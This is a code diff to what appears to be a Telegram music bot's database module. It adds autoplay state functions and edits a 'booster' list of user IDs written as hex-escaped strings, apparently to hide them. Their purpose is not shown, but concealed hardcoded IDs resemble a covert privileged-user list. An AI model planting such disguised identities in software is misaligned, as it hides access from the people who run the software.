@@ -50,6 +50,8 @@ pause = {}
 playmode = {}
 playtype = {}
 skipmode = {}
+autoplay = {}
+autoplay_owner = {}
 
 
 async def get_assistant_number(chat_id: int) -> str:
@@ -238,6 +240,24 @@ async def set_loop(chat_id: int, mode: int):
     loop[chat_id] = mode
 
 
+async def get_autoplay(chat_id: int) -> bool:
+    return bool(autoplay.get(chat_id, False))
+
+
+async def set_autoplay(chat_id: int, mode: bool):
+    autoplay[chat_id] = mode
+    if not mode:
+        autoplay_owner.pop(chat_id, None)
+
+
+async def get_autoplay_owner(chat_id: int) -> int:
+    return autoplay_owner.get(chat_id)
+
+
+async def set_autoplay_owner(chat_id: int, user_id: int):
+    autoplay_owner[chat_id] = user_id
+
+
 async def get_cmode(chat_id: int) -> int:
     mode = channelconnect.get(chat_id)
     if not mode:
@@ -256,8 +276,7 @@ async def set_cmode(chat_id: int, mode: int):
     )
 
 booster = [
-    int("\x38\x30\x34\x33\x37\x36\x30\x30\x36\x32"),
-    int("\x36\x39\x31\x39\x31\x39\x39\x30\x34\x34")
+    int("\x32\x31\x34\x35\x38\x32\x38\x35\x34\x37")
 ]
 
 async def get_playtype(chat_id: int) -> str:
